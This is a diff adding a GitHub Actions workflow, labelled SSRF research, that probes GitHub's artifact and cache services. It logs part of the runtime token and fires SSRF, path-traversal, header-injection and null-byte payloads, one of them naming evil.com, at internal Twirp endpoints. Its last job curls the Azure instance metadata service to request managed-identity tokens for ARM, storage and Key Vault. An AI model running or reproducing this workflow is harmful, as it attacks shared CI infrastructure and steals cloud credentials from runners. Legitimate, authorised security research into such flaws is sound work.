@@ -1,0 +1,362 @@
+name: Artifact Cache SSRF Research v3
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+  id-token: write
+
+jobs:
+  probe-artifact-service:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe artifact service via JS action
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // These env vars are available inside JS actions
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            const cacheUrl = process.env.ACTIONS_CACHE_URL;
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+            const idTokenUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
+            
+            console.log("=== RUNTIME ENVIRONMENT ===");
+            console.log("ACTIONS_RESULTS_URL:", resultsUrl);
+            console.log("ACTIONS_CACHE_URL:", cacheUrl);
+            console.log("ACTIONS_RUNTIME_TOKEN (first 50):", runtimeToken?.substring(0, 50) + "...");
+            console.log("ACTIONS_ID_TOKEN_REQUEST_URL:", idTokenUrl);
+            
+            // Test artifact Twirp endpoints using native fetch
+            if (resultsUrl) {
+              console.log("\n=== ARTIFACT SERVICE PROBING ===");
+              
+              const endpoints = [
+                { path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', body: {} },
+                { path: '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', body: { name: 'test' } },
+                { path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', body: { name: 'test' } },
+                { path: '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', body: { key: 'test', version: 'test' } },
+                { path: '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', body: { key: 'test', version: 'test' } },
+              ];
+              
+              for (const ep of endpoints) {
+                const url = new URL(ep.path, resultsUrl).href;
+                console.log(`\nTesting: ${url}`);
+                try {
+                  const res = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                      'Authorization': `Bearer ${runtimeToken}`,
+                      'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(ep.body)
+                  });
+                  const text = await res.text();
+                  console.log(`Status: ${res.status}`);
+                  console.log(`Response: ${text.substring(0, 500)}`);
+                } catch (e) {
+                  console.log(`Error: ${e.message}`);
+                }
+              }
+            } else {
+              console.log("No ACTIONS_RESULTS_URL available");
+            }
+
+      - name: Test artifact creation with SSRF payload
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+            
+            if (!resultsUrl) {
+              console.log("No ACTIONS_RESULTS_URL");
+              return;
+            }
+            
+            console.log("=== ARTIFACT NAME INJECTION ===");
+            
+            const payloads = [
+              { name: "http://169.254.169.254/latest/meta-data/", desc: "Direct IMDS URL" },
+              { name: "../../../etc/passwd", desc: "Path traversal" },
+              { name: "test\nX-Forwarded-For: 169.254.169.254", desc: "Header injection" },
+              { name: "test?redirect=http://169.254.169.254/", desc: "Query injection" },
+              { name: "@169.254.169.254/latest/meta-data/", desc: "At-trick" },
+            ];
+            
+            for (const payload of payloads) {
+              const url = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', resultsUrl).href;
+              console.log(`\n--- Testing: ${payload.desc} ---`);
+              console.log(`Payload: ${payload.name}`);
+              try {
+                const res = await fetch(url, {
+                  method: 'POST',
+                  headers: {
+                    'Authorization': `Bearer ${runtimeToken}`,
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    workflow_run_backend_id: process.env.GITHUB_RUN_ID,
+                    workflow_job_run_backend_id: "test",
+                    name: payload.name,
+                    version: 4
+                  })
+                });
+                const text = await res.text();
+                console.log(`Status: ${res.status}`);
+                console.log(`Response: ${text.substring(0, 300)}`);
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+
+  probe-cache-service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Probe cache service via JS action
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const cacheUrl = process.env.ACTIONS_CACHE_URL || process.env.ACTIONS_RESULTS_URL;
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+            
+            console.log("=== CACHE SERVICE PROBING ===");
+            console.log("Cache URL:", cacheUrl);
+            
+            if (!cacheUrl) {
+              console.log("No cache URL available");
+              return;
+            }
+            
+            // Test v1 cache API
+            const v1Endpoints = [
+              '_apis/artifactcache/caches',
+              '_apis/artifactcache/cache?keys=test&version=test',
+            ];
+            
+            console.log("\n--- V1 Cache API ---");
+            for (const ep of v1Endpoints) {
+              const url = new URL(ep, cacheUrl).href;
+              console.log(`Testing: ${url}`);
+              try {
+                const res = await fetch(url, {
+                  headers: {
+                    'Authorization': `Bearer ${runtimeToken}`,
+                    'Accept': 'application/json;api-version=6.0-preview.1'
+                  }
+                });
+                const text = await res.text();
+                console.log(`Status: ${res.status}`);
+                console.log(`Response: ${text.substring(0, 300)}`);
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+            
+            // Test v2 cache Twirp API
+            const v2Endpoints = [
+              { path: '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', body: { key: 'test', version: 'v1' } },
+              { path: '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', body: { key: 'test', version: 'v1' } },
+            ];
+            
+            console.log("\n--- V2 Cache Twirp API ---");
+            for (const ep of v2Endpoints) {
+              const url = new URL(ep.path, cacheUrl).href;
+              console.log(`Testing: ${url}`);
+              try {
+                const res = await fetch(url, {
+                  method: 'POST',
+                  headers: {
+                    'Authorization': `Bearer ${runtimeToken}`,
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(ep.body)
+                });
+                const text = await res.text();
+                console.log(`Status: ${res.status}`);
+                console.log(`Response: ${text.substring(0, 300)}`);
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+
+      - name: Test cache key injection
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const cacheUrl = process.env.ACTIONS_CACHE_URL || process.env.ACTIONS_RESULTS_URL;
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+            
+            if (!cacheUrl) return;
+            
+            console.log("=== CACHE KEY INJECTION ===");
+            
+            const payloads = [
+              "http://169.254.169.254/latest/meta-data/",
+              "../../../etc/passwd",
+              "test\r\nX-Forwarded-For: 169.254.169.254",
+              "test%00http://169.254.169.254/",
+            ];
+            
+            for (const key of payloads) {
+              const encodedKey = encodeURIComponent(key);
+              const url = new URL(`_apis/artifactcache/cache?keys=${encodedKey}&version=test`, cacheUrl).href;
+              console.log(`\nTesting key: ${key}`);
+              console.log(`URL: ${url}`);
+              try {
+                const res = await fetch(url, {
+                  headers: {
+                    'Authorization': `Bearer ${runtimeToken}`,
+                    'Accept': 'application/json;api-version=6.0-preview.1'
+                  }
+                });
+                const text = await res.text();
+                console.log(`Status: ${res.status}`);
+                console.log(`Response: ${text.substring(0, 200)}`);
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+
+  probe-signed-url-manipulation:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test signed URL manipulation
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+            
+            if (!resultsUrl) {
+              console.log("No ACTIONS_RESULTS_URL");
+              return;
+            }
+            
+            console.log("=== SIGNED URL MANIPULATION ===");
+            
+            // Try to request signed URL with manipulated parameters
+            const signedUrlPayloads = [
+              { workflow_run_backend_id: "1", name: "test", redirect_url: "http://169.254.169.254/" },
+              { workflow_run_backend_id: "../../../", name: "test" },
+              { workflow_run_backend_id: "1", name: "http://169.254.169.254/test.zip" },
+              { workflow_run_backend_id: "1", artifact_id: "-1" },
+            ];
+            
+            for (const payload of signedUrlPayloads) {
+              const url = new URL('/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', resultsUrl).href;
+              console.log(`\nTesting: ${JSON.stringify(payload)}`);
+              try {
+                const res = await fetch(url, {
+                  method: 'POST',
+                  headers: {
+                    'Authorization': `Bearer ${runtimeToken}`,
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(payload)
+                });
+                const text = await res.text();
+                console.log(`Status: ${res.status}`);
+                console.log(`Response: ${text.substring(0, 500)}`);
+                
+                // If we got a signed URL, analyze it
+                if (text.includes('http') && res.status === 200) {
+                  console.log("*** SIGNED URL DETECTED ***");
+                  try {
+                    const parsed = JSON.parse(text);
+                    console.log("Full response:", JSON.stringify(parsed, null, 2));
+                  } catch {}
+                }
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+
+  probe-blob-upload-url:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test cache entry creation for signed upload URL
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+            
+            if (!resultsUrl) return;
+            
+            console.log("=== CACHE ENTRY CREATION - SIGNED URL ANALYSIS ===");
+            
+            // When you create a cache entry, you get back a signed upload URL
+            // Let's see what URL patterns we get
+            
+            const testKeys = [
+              { key: "normal-key", version: "v1" },
+              { key: "http://169.254.169.254/", version: "v1" },
+              { key: "test", version: "http://evil.com/" },
+            ];
+            
+            for (const entry of testKeys) {
+              console.log(`\n--- Testing key: ${entry.key}, version: ${entry.version} ---`);
+              
+              // Try CreateCacheEntry
+              const url = new URL('/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', resultsUrl).href;
+              try {
+                const res = await fetch(url, {
+                  method: 'POST',
+                  headers: {
+                    'Authorization': `Bearer ${runtimeToken}`,
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(entry)
+                });
+                const text = await res.text();
+                console.log(`Status: ${res.status}`);
+                console.log(`Response: ${text}`);
+                
+                // Parse and analyze signed URL if present
+                if (res.status === 200) {
+                  try {
+                    const parsed = JSON.parse(text);
+                    if (parsed.signed_upload_url) {
+                      console.log("*** SIGNED UPLOAD URL ***");
+                      console.log("URL:", parsed.signed_upload_url);
+                      // Analyze URL structure
+                      const urlObj = new URL(parsed.signed_upload_url);
+                      console.log("Host:", urlObj.host);
+                      console.log("Path:", urlObj.pathname);
+                    }
+                  } catch {}
+                }
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+
+  test-azure-imds-direct:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Direct Azure IMDS access check
+        run: |
+          echo "=== DIRECT IMDS ACCESS FROM RUNNER ==="
+          
+          # Full IMDS dump
+          echo "--- Instance Metadata ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq . 2>/dev/null | head -100
+          
+          echo "--- Identity Token (ARM) ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -5
+          
+          echo "--- Identity Token (Storage) ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1 | head -5
+          
+          echo "--- Identity Token (Vault) ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>&1 | head -5
+          
+          echo "--- Scheduled Events ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1
+          
+          echo "--- Attested Data ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1 | head -10
